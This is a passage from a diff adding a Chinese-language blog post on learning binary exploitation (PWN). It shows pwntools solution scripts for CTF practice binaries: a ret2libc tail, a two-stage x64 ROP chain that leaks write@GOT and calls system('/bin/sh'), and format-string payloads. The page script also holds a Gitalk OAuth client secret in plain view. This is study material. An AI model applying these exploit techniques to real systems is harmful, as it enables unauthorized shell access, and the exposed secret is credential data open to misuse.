class="string">b"/bin/sh"</span>))</span><br><span class="line"><span class="comment">#libc_write=libc.symbols['write']</span></span><br><span class="line"><span class="comment">#libc_system=libc.symbols['system']</span></span><br><span class="line"><span class="comment">#libc_sh=next(libc.search(b'/bin/sh'))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#system_addr=write_addr-libc_write+libc_system </span></span><br><span class="line"><span class="comment">#sh_addr=write_addr-libc_write+libc_sh</span></span><br><span class="line">payload2 = cyclic(<span class="number">0x88</span>+<span class="number">4</span>) + p32(system_addr) + <span class="string">b'A'</span>*<span class="number">4</span> + p32(sh_addr)</span><br><span class="line">io.sendline(payload2)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+<h3 id="pwn3-x64"><a href="#pwn3-x64" class="headerlink" title="pwn3_x64"></a>pwn3_x64</h3><p>两次ROP</p>
+<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201117174620932.png" alt="image-20201117174620932"></p>
+<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201117174719721.png" alt="image-20201117174719721"></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line"><span class="comment">#context.log_level="debug" </span></span><br><span class="line">elf=ELF(<span class="string">"level3_x64"</span>) </span><br><span class="line">write_plt=elf.symbols[<span class="string">"write"</span>] </span><br><span class="line">write_got=elf.got[<span class="string">"write"</span>] </span><br><span class="line">vul_addr=elf.symbols[<span class="string">'vulnerable_function'</span>]</span><br><span class="line">p = process(<span class="string">"./level3_x64"</span>)</span><br><span class="line"><span class="comment">#p=remote("47.116.107.8",9883) </span></span><br><span class="line">p.recvuntil(<span class="string">b"Input:\n"</span>) </span><br><span class="line">pop_rdi_addr=<span class="number">0x00000000004006b3</span>   <span class="comment">#0x00000000004006b3 : pop rdi ; ret</span></span><br><span class="line">pop_rsi_r15_addr=<span class="number">0x00000000004006b1</span>      <span class="comment">#0x00000000004006b1 : pop rsi ; pop r15 ; ret</span></span><br><span class="line">payload1 = cyclic(<span class="number">0x80</span>+<span class="number">8</span>) + p64(pop_rdi_addr) + p64(<span class="number">1</span>) + p64(pop_rsi_r15_addr) + p64(write_got) + p64(<span class="string">'deadbeef'</span>) + p64(write_plt) + p64(vul_addr) </span><br><span class="line">p.sendline(payload1) </span><br><span class="line">t=p.recv(<span class="number">8</span>)</span><br><span class="line">write_addr=u64(t[<span class="number">0</span>:<span class="number">8</span>]) </span><br><span class="line"></span><br><span class="line">libc=ELF(<span class="string">"/lib/x86_64-linux-gnu/libc.so.6"</span>) </span><br><span class="line">offset=write_addr-libc.symbols[<span class="string">"write"</span>] </span><br><span class="line">sys_addr=offset+libc.symbols[<span class="string">"system"</span>] </span><br><span class="line">bin_addr=offset+next(libc.search(<span class="string">b"/bin/sh"</span>))</span><br><span class="line">payload2 = cyclic(<span class="number">0x80</span>+<span class="number">8</span>) + p64(pop_rdi_addr) + p64(bin_addr) + p64(sys_addr)</span><br><span class="line">p.sendline(payload2) </span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<h3 id="fmtstr1"><a href="#fmtstr1" class="headerlink" title="fmtstr1"></a>fmtstr1</h3><p>还是比较简单的</p>
+<p>思路：将x的地址放到栈上，对应的获取栈上的地址相对于<code>printf</code>的第几个参数</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"> </span><br><span class="line">conn=process(<span class="string">'./fmtstr1'</span>)</span><br><span class="line">e=ELF(<span class="string">'./fmtstr1'</span>)</span><br><span class="line">x_addr=<span class="number">0x0804A02C</span>                                      </span><br><span class="line">payload=p32(x_addr) + <span class="string">b"%11$n"</span></span><br><span class="line">conn.sendline(payload)</span><br><span class="line">conn.interactive()</span><br></pre></td></tr></table></figure>
+<h3 id="fmstr2"><a href="#fmstr2" class="headerlink" title="fmstr2"></a>fmstr2</h3><p>这题很奇怪 X64  感觉是爆破出来的</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%9$s</span><br></pre></td></tr></table></figure>
+
+    </div>
+
+    
+    
+    
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>Pz1o
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="http://yoursite.com/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/" title="PWN学习">http://yoursite.com/2020/10/24/PWN学习/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/PWN/" rel="tag"># PWN</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2020/10/24/CUMT2020%E5%8D%8E%E4%B8%BA%E6%9D%AF/" rel="prev" title="CUMT2020华为杯">
+      <i class="fa fa-chevron-left"></i> CUMT2020华为杯
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2020/10/27/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/" rel="next" title="逆向工程核心原理读书笔记">
+      逆向工程核心原理读书笔记 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+    <div class="comments" id="gitalk-container"></div>
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#PWN"><span class="nav-number">1.</span> <span class="nav-text">PWN</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#基础"><span class="nav-number">2.</span> <span class="nav-text">基础</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#ELF文件"><span class="nav-number">2.1.</span> <span class="nav-text">ELF文件</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#虚拟内存"><span class="nav-number">2.2.</span> <span class="nav-text">虚拟内存</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#程序编译与链接"><span class="nav-number">2.3.</span> <span class="nav-text">程序编译与链接</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#程序装载与进程执行"><span class="nav-number">2.4.</span> <span class="nav-text">程序装载与进程执行</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#汇编指令"><span class="nav-number">2.5.</span> <span class="nav-text">汇编指令</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#栈溢出基础"><span class="nav-number">3.</span> <span class="nav-text">栈溢出基础</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#基本原理"><span class="nav-number">3.1.</span> <span class="nav-text">基本原理</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#实例"><span class="nav-number">3.2.</span> <span class="nav-text">实例</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#攻击"><span class="nav-number">3.3.</span> <span class="nav-text">攻击</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#ret2text"><span class="nav-number">3.3.1.</span> <span class="nav-text">ret2text</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ret2shellcode"><span class="nav-number">3.3.2.</span> <span class="nav-text">ret2shellcode</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ret2libc"><span class="nav-number">3.3.3.</span> <span class="nav-text">ret2libc</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#返回导向编程"><span class="nav-number">4.</span> <span class="nav-text">返回导向编程</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#基础-1"><span class="nav-number">4.1.</span> <span class="nav-text">基础</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#攻击-1"><span class="nav-number">4.2.</span> <span class="nav-text">攻击</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#x64"><span class="nav-number">4.3.</span> <span class="nav-text">x64</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#动态链接过程"><span class="nav-number">5.</span> <span class="nav-text">动态链接过程</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#保护措施"><span class="nav-number">6.</span> <span class="nav-text">保护措施</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#RELRO"><span class="nav-number">6.1.</span> <span class="nav-text">RELRO</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#The-NX-bits"><span class="nav-number">6.2.</span> <span class="nav-text">The NX bits</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ASLR"><span class="nav-number">6.3.</span> <span class="nav-text">ASLR</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Canary"><span class="nav-number">6.4.</span> <span class="nav-text">Canary</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#PIE"><span class="nav-number">6.5.</span> <span class="nav-text">PIE</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#栈迁移"><span class="nav-number">7.</span> <span class="nav-text">栈迁移</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#格式化字符串漏洞"><span class="nav-number">8.</span> <span class="nav-text">格式化字符串漏洞</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#堆"><span class="nav-number">9.</span> <span class="nav-text">堆</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#什么是堆"><span class="nav-number">9.1.</span> <span class="nav-text">什么是堆</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#堆管理器"><span class="nav-number">9.2.</span> <span class="nav-text">堆管理器</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#arena"><span class="nav-number">9.2.1.</span> <span class="nav-text">arena</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#chunk"><span class="nav-number">9.2.2.</span> <span class="nav-text">chunk</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#malloced-chunk"><span class="nav-number">9.2.2.1.</span> <span class="nav-text">malloced chunk</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#free-chunk"><span class="nav-number">9.2.2.2.</span> <span class="nav-text">free chunk</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#bin"><span class="nav-number">9.2.3.</span> <span class="nav-text">bin</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#tcache"><span class="nav-number">9.2.3.1.</span> <span class="nav-text">tcache</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#fastbins"><span class="nav-number">9.2.3.2.</span> <span class="nav-text">fastbins</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#unsorted-bin"><span class="nav-number">9.2.3.3.</span> <span class="nav-text">unsorted bin</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#small-bins"><span class="nav-number">9.2.3.4.</span> <span class="nav-text">small bins</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#large-bins"><span class="nav-number">9.2.3.5.</span> <span class="nav-text">large bins</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#堆漏洞"><span class="nav-number">10.</span> <span class="nav-text">堆漏洞</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#工具学习"><span class="nav-number">11.</span> <span class="nav-text">工具学习</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#pwntools"><span class="nav-number">11.1.</span> <span class="nav-text">pwntools</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#gdb"><span class="nav-number">11.2.</span> <span class="nav-text">gdb</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#IDA"><span class="nav-number">11.3.</span> <span class="nav-text">IDA</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ROPgadget"><span class="nav-number">11.4.</span> <span class="nav-text">ROPgadget</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#one-gadget"><span class="nav-number">11.5.</span> <span class="nav-text">one_gadget</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#练习题"><span class="nav-number">12.</span> <span class="nav-text">练习题</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#栈溢出"><span class="nav-number">12.1.</span> <span class="nav-text">栈溢出</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#ret2text-1"><span class="nav-number">12.1.1.</span> <span class="nav-text">ret2text</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ret2shellcode-1"><span class="nav-number">12.1.2.</span> <span class="nav-text">ret2shellcode</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ret2syscall"><span class="nav-number">12.1.3.</span> <span class="nav-text">ret2syscall</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ret2libc1"><span class="nav-number">12.1.4.</span> <span class="nav-text">ret2libc1</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ret2libc2"><span class="nav-number">12.1.5.</span> <span class="nav-text">ret2libc2</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#retlibc3"><span class="nav-number">12.1.6.</span> <span class="nav-text">retlibc3</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#pwn2-x64"><span class="nav-number">12.1.7.</span> <span class="nav-text">pwn2_x64</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#pwn3"><span class="nav-number">12.1.8.</span> <span class="nav-text">pwn3</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#pwn3-x64"><span class="nav-number">12.1.9.</span> <span class="nav-text">pwn3_x64</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#fmtstr1"><span class="nav-number">12.1.10.</span> <span class="nav-text">fmtstr1</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#fmstr2"><span class="nav-number">12.1.11.</span> <span class="nav-text">fmstr2</span></a></li></ol></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Pz1o"
+      src="/images/timg.jpeg">
+  <p class="site-author-name" itemprop="name">Pz1o</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">14</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">9</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">16</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Pz1o</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-area"></i>
+    </span>
+    <span title="站点总字数">104k</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="站点阅读时长">1:34</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+  <script defer src="/lib/three/three.min.js"></script>
+    <script defer src="/lib/three/canvas_lines.min.js"></script>
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.css">
+
+<script>
+NexT.utils.loadComments(document.querySelector('#gitalk-container'), () => {
+  NexT.utils.getScript('//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js', () => {
+    var gitalk = new Gitalk({
+      clientID    : '39c3461c126ff179de81',
+      clientSecret: '07cc5b1c7e860dc2430617d4e53c6d8610d1e09f',
+      repo        : 'comments',
+      owner       : 'pz1o',
+      admin       : ['pz1o'],
+      id          : 'a749f827693b0c21c6381846153b7c96',
+        language: 'zh-CN',
+      distractionFreeMode: true
+    });
+    gitalk.render('gitalk-container');
+  }, window.Gitalk);
+});
+</script>
+
+</body>
+</html>
